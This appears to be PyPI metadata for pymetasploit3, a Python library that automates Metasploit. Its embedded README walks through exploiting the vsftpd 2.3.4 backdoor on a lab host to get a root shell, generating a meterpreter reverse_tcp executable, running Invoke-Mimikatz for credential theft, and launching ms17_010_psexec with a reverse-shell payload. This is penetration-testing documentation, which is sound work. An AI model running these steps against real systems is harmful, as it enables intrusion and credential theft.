{
  "info": {
    "author": "Dan McInerney",
    "author_email": "danhmcinerney@gmail.com",
    "bugtrack_url": null,
    "classifiers": [],
    "description": "Pymetasploit3\n=======\n\nPymetasploit3 is a full-fledged Python3 Metasploit automation library. It can interact with Metasploit either through msfrpcd or the msgrpc plugin in msfconsole.\n\n# Original library: pymetasploit\n\nThis is an updated and improved version of the Python2 pymetasploit library by allfro.\n\nOriginal project  : https://github.com/allfro/pymetasploit\n\n# Installation\n\n    mkdir your-project\n    cd your-project\n    pipenv install --three pymetasploit3\n    pipenv shell\n\nor:\n\n    pip3 install --user pymetasploit3\n\n# Basic Usage\n\n## Starting Metasploit RPC server\nYou can start the RPC server either with ```msfrpcd``` or ```msfconsole```\n\n### Msfconsole\nThis will start the RPC server on port 55552 as well as the Metasploit console UI\n```bash\n$ msfconsole\nmsf> load msgrpc [Pass=yourpassword]\n```\n### msfrpcd\nThis will start the RPC server on port 55553 and will just start the RPC server in the background\n```bash\n$ msfrpcd -P yourpassword -S\n```\n\n## RPC client\n\n### Connecting to `msfrpcd`\n\n```python\n>>> from pymetasploit3.msfrpc import MsfRpcClient\n>>> client = MsfRpcClient('yourpassword', ssl=True)\n```\n### Connecting to `msfconsole` with `msgrpc` plugin loaded\n\n```python\n>>> from pymetasploit3.msfrpc import MsfRpcClient\n>>> client = MsfRpcClient('yourpassword', port=55552, True)\n```\n\n### MsfRpcClient\n\nThe `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use\n```dir(client)``` to see the callable methods.\n\n```python\n>>> [m for m in dir(client) if not m.startswith('_')]\n['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',\n'port', 'server', 'token', 'sessions', 'ssl', 'uri']\n>>>\n```\n\nLike the metasploit framework, `MsfRpcClient` is segmented into different management modules:\n\n* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.\n* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.\n* **`core`**: manages the Metasploit framework core.\n* **`db`**: manages the backend database connectivity for `msfrpcd`.\n* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)\n* **`plugins`**: manages the plugins associated with the Metasploit core.\n* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.\n\n### Running an exploit\n\nExplore exploit modules:\n\n```python\n>>> client.modules.exploits\n['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',\n'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...\n'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']\n>>>\n```\n\nCreate an exploit module object:\n\n```python\n>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')\n>>>\n```\n\nExplore exploit information:\n\n```python\n>>>  print(exploit.description)\n\n          This module exploits a malicious backdoor that was added to the\tVSFTPD download\n          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between\n          June 30th 2011 and July 1st 2011 according to the most recent information\n          available. This backdoor was removed on July 3rd 2011.\n\n>>> exploit.options\n['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',\n'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',\n'DisablePayloadHandler', 'RPORT', 'RHOSTS']\n>>> exploit.missing_required # Required options which haven't been set yet\n['RHOSTS']\n>>>\n```\n\nLet's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare\nmachine as our exploit target. It's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit\nmodule loaded. Our next step is to specify our target:\n\n```python\n>>> exploit['RHOSTS'] = '172.16.14.145' # IP of our target host\n>>>\n```\n\nSelect a payload:\n\n```python\n>>> exploit.targetpayloads()\n['cmd/unix/interact']\n>>>\n```\n\nAt this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:\n\n```python\n>>> exploit.execute(payload='cmd/unix/interact')\n{'job_id': 1, 'uuid': '3whbuevf'}\n>>>\n```\n\nWe know the job ran successfully because `job_id` is `1`. If the module failed to execute for any reason, `job_id` would\n be `None`. If we managed to pop our box, we might see something nice in the sessions list:\n\n```python\n>>> client.sessions.list\n{1: {'info': '', 'username': 'jsmith', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',\n'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',\n'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',\n'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}\n>>>\n```\n\n### generate a payload\n\nCreate a payload module object:\n\n```python\npayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')\n```\n\nView module information as described above\n\nSetting runoptions and generate payload\n\n```python\n# set runoptions\npayload.runoptions['BadChars'] = ''\npayload.runoptions['Encoder'] = ''\npayload.runoptions['Format'] = 'exe\npayload.runoptions['NopSledSize'] = 0\npayload.runoptions['ForceEncode'] = False\n# payload.runoptions['Template'] = ''\npayload.runoptions['Platform'] = ''\n# payload.runoptions['KeepTemplateWorking'] = True\npayload.runoptions['Iterations'] = 0\n\ndata = payload.payload_generate()\nif isinstance(data, str):\n    print(data)\nelse:\n    with open('test.exe', 'wb') as f:\n        f.write(data)\n```\n\n### Interacting with the shell\nCreate a shell object out of the session number we found above and write to it:\n\n```python\n>>> shell = client.sessions.session('1')\n>>> shell.write('whoami')\n>>> print(shell.read())\nroot\n>>>\n```\n\nRun the same `exploit` object as before but wait until it completes and gather it's output:\n\n```python\n>>> cid = client.consoles.console().cid # Create a new console and store its number in 'cid'\n>>> print(client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))\n# Some time passes\n'[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4\n[*] 172.16.14.145:21 - USER: 331 Please specify the password\n...'\n\n```\n\n`client.sessions.session('1')` has the same `.write('some string')` and `.read()` methods, but running session commands and\n waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return\n a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a\n `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a\n list of strings that, when any one is found in the session's output, will tell us that the session is done running\n its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one\n large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object.\n\n ```python\n>>> session_id = '1'\n>>> session_command = 'arp'\n>>> terminating_strs = ['----']\n>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs)\n# Some time passes\n'\\nARP Table\\n                  ---------------\\n  ...`\n```\nRun a PowerShell script with output\n```python\n>>> session_id = '1'\n>>> psh_script_path  = '/home/user/scripts/Invoke-Mimikatz.ps1'\n>>> session = c.sessions.session(sessions_id)\n>>> sessions.import_psh(psh_script_path)\n>>> sessions.run_psh_cmd('Invoke-Mimikatz')\n# Some time passes\n'Mimikatz output...'\n```\n\nOne can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to\nMetasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set\n `timeout_exception` to `False` and the library will simply return all the data from the session output it found before\n the timeout expired.\n ```python\n>>> session_id = '1'\n>>> session_command = 'arp'\n>>> terminating_strs = ['----']\n>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs, timeout=10, timeout_exception=False))\n# 10s pass\n'\\nARP Table\\n                  ---------------\\n  ...`\n```\n\n### Configuring payload options\n\nFor some usecases you might need to specify payload options, here's an example on how to do so.\n\n\texploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')\n\texploit['RHOSTS'] = '172.28.128.13'\n\tpayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')\n\tpayload['LHOST'] = '172.28.128.1'\n\tpayload['LPORT'] = 4444\n\texploit.execute(payload=payload)\n\n\n### More examples\n\nMany other usage examples can be found in the `example_usage.py` file.\n\n# Contributions\n\nI highly encourage contributors to send in any and all pull requests or issues. Thank you to allfro for writing\nthe original pymetasploit library.\n\n\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "https://github.com/DanMcInerney/pymetasploit3/zipball/master",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "https://github.com/DanMcInerney/pymetasploit3",
    "keywords": "",
    "license": "GPL",
    "maintainer": "",
    "maintainer_email": "",
    "name": "pymetasploit3",
    "package_url": "https://pypi.org/project/pymetasploit3/",
    "platform": "",
    "project_url": "https://pypi.org/project/pymetasploit3/",
    "project_urls": {
      "Download": "https://github.com/DanMcInerney/pymetasploit3/zipball/master",
      "Homepage": "https://github.com/DanMcInerney/pymetasploit3"
    },
    "release_url": "https://pypi.org/project/pymetasploit3/1.0.3/",
    "requires_dist": [
      "retry",
      "msgpack",
      "requests"
    ],
    "requires_python": "",
    "summary": "A full-fledged msfrpc library for Metasploit framework.",
    "version": "1.0.3",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 7640425,
  "releases": {
    "1.0": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "841944776d4a68bc790b90c4d063ba2ac71047bfbf90d63710c710d1d34c1253",
          "md5": "0141cf12ef0d25d2e1c2c357bd4e5d57",
          "sha256": "b8e967d1e0bd4c240ce4c2aa382e601306862d7968dd41bfdbdbee482adaf009"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.tar.gz",
        "has_sig": false,
        "md5_digest": "0141cf12ef0d25d2e1c2c357bd4e5d57",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 21945,
        "upload_time": "2019-04-16T21:36:44",
        "upload_time_iso_8601": "2019-04-16T21:36:44.491443Z",
        "url": "https://files.pythonhosted.org/packages/84/19/44776d4a68bc790b90c4d063ba2ac71047bfbf90d63710c710d1d34c1253/pymetasploit3-1.0.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ],
    "1.0.1": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "ce110183785e0df856e7516f7a176512344550eef5cf1e7e90f618faa1776461",
          "md5": "25379b7d0b720bcc5d644bac1f0f89a0",
          "sha256": "065b21fbf3d422b4a94d9aab03d9963c519b047c4b49354f327fe73df39ca3ed"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.1.tar.gz",
        "has_sig": false,
        "md5_digest": "25379b7d0b720bcc5d644bac1f0f89a0",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 21840,
        "upload_time": "2019-04-22T22:03:43",
        "upload_time_iso_8601": "2019-04-22T22:03:43.885400Z",
        "url": "https://files.pythonhosted.org/packages/ce/11/0183785e0df856e7516f7a176512344550eef5cf1e7e90f618faa1776461/pymetasploit3-1.0.1.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ],
    "1.0.2": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "b8f3242bc8e792db214bd5b60b0e82286934cc778cbb11bb99e66814b68a9a31",
          "md5": "0c576bce6e09ea99efc1e8b41285d2ff",
          "sha256": "99c8560762b6fc9d6c8467d65e5bcaeab4ef579b317ee48284aecf951d14f3b2"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.2-py2-none-any.whl",
        "has_sig": false,
        "md5_digest": "0c576bce6e09ea99efc1e8b41285d2ff",
        "packagetype": "bdist_wheel",
        "python_version": "py2",
        "requires_python": null,
        "size": 29359,
        "upload_time": "2019-09-09T16:14:09",
        "upload_time_iso_8601": "2019-09-09T16:14:09.387045Z",
        "url": "https://files.pythonhosted.org/packages/b8/f3/242bc8e792db214bd5b60b0e82286934cc778cbb11bb99e66814b68a9a31/pymetasploit3-1.0.2-py2-none-any.whl",
        "yanked": false,
        "yanked_reason": null
      },
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "e00308ec9031d30da09f35d7dd19eb21b02ee3440ca7f9235cb67e09aa5f0cf4",
          "md5": "f7a5c0ef5072fdaa3b2a0bf405e14ba2",
          "sha256": "d2c36263da4d72c59bb2b7e25ae139317028ac70722f7d2a645feb54647f9333"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.2.tar.gz",
        "has_sig": false,
        "md5_digest": "f7a5c0ef5072fdaa3b2a0bf405e14ba2",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 18171,
        "upload_time": "2019-09-09T16:14:10",
        "upload_time_iso_8601": "2019-09-09T16:14:10.962565Z",
        "url": "https://files.pythonhosted.org/packages/e0/03/08ec9031d30da09f35d7dd19eb21b02ee3440ca7f9235cb67e09aa5f0cf4/pymetasploit3-1.0.2.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ],
    "1.0.3": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "180514fa27e1f1f2b2304238788f7d87501ee9cfa5f7d38e9eabc94f81071b0c",
          "md5": "6c9e64e3ad8f6d2d2b7cbd5d473f6a22",
          "sha256": "79b9058c2d81f6ada9da307ddd52128e00f9010222e693bd88b0928aebcc3ec3"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.3-py2.py3-none-any.whl",
        "has_sig": false,
        "md5_digest": "6c9e64e3ad8f6d2d2b7cbd5d473f6a22",
        "packagetype": "bdist_wheel",
        "python_version": "py2.py3",
        "requires_python": null,
        "size": 33375,
        "upload_time": "2020-07-06T17:14:16",
        "upload_time_iso_8601": "2020-07-06T17:14:16.824757Z",
        "url": "https://files.pythonhosted.org/packages/18/05/14fa27e1f1f2b2304238788f7d87501ee9cfa5f7d38e9eabc94f81071b0c/pymetasploit3-1.0.3-py2.py3-none-any.whl",
        "yanked": false,
        "yanked_reason": null
      },
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "edcbcc84c47f7bf2f75a69412fda33ad8e59f6970bb3e3f87ced6456ce66c60c",
          "md5": "a67a471bdc950214a4b2b51661b962a8",
          "sha256": "6c4776e98f77734063dd198531a9f5ac7b3c1c8347b647fb653304c6ba2b5157"
        },
        "downloads": -1,
        "filename": "pymetasploit3-1.0.3.tar.gz",
        "has_sig": false,
        "md5_digest": "a67a471bdc950214a4b2b51661b962a8",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 23325,
        "upload_time": "2020-07-06T17:14:18",
        "upload_time_iso_8601": "2020-07-06T17:14:18.256094Z",
        "url": "https://files.pythonhosted.org/packages/ed/cb/cc84c47f7bf2f75a69412fda33ad8e59f6970bb3e3f87ced6456ce66c60c/pymetasploit3-1.0.3.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "180514fa27e1f1f2b2304238788f7d87501ee9cfa5f7d38e9eabc94f81071b0c",
        "md5": "6c9e64e3ad8f6d2d2b7cbd5d473f6a22",
        "sha256": "79b9058c2d81f6ada9da307ddd52128e00f9010222e693bd88b0928aebcc3ec3"
      },
      "downloads": -1,
      "filename": "pymetasploit3-1.0.3-py2.py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "6c9e64e3ad8f6d2d2b7cbd5d473f6a22",
      "packagetype": "bdist_wheel",
      "python_version": "py2.py3",
      "requires_python": null,
      "size": 33375,
      "upload_time": "2020-07-06T17:14:16",
      "upload_time_iso_8601": "2020-07-06T17:14:16.824757Z",
      "url": "https://files.pythonhosted.org/packages/18/05/14fa27e1f1f2b2304238788f7d87501ee9cfa5f7d38e9eabc94f81071b0c/pymetasploit3-1.0.3-py2.py3-none-any.whl",
      "yanked": false,
      "yanked_reason": null
    },
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "edcbcc84c47f7bf2f75a69412fda33ad8e59f6970bb3e3f87ced6456ce66c60c",
        "md5": "a67a471bdc950214a4b2b51661b962a8",
        "sha256": "6c4776e98f77734063dd198531a9f5ac7b3c1c8347b647fb653304c6ba2b5157"
      },
      "downloads": -1,
      "filename": "pymetasploit3-1.0.3.tar.gz",
      "has_sig": false,
      "md5_digest": "a67a471bdc950214a4b2b51661b962a8",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": null,
      "size": 23325,
      "upload_time": "2020-07-06T17:14:18",
      "upload_time_iso_8601": "2020-07-06T17:14:18.256094Z",
      "url": "https://files.pythonhosted.org/packages/ed/cb/cc84c47f7bf2f75a69412fda33ad8e59f6970bb3e3f87ced6456ce66c60c/pymetasploit3-1.0.3.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}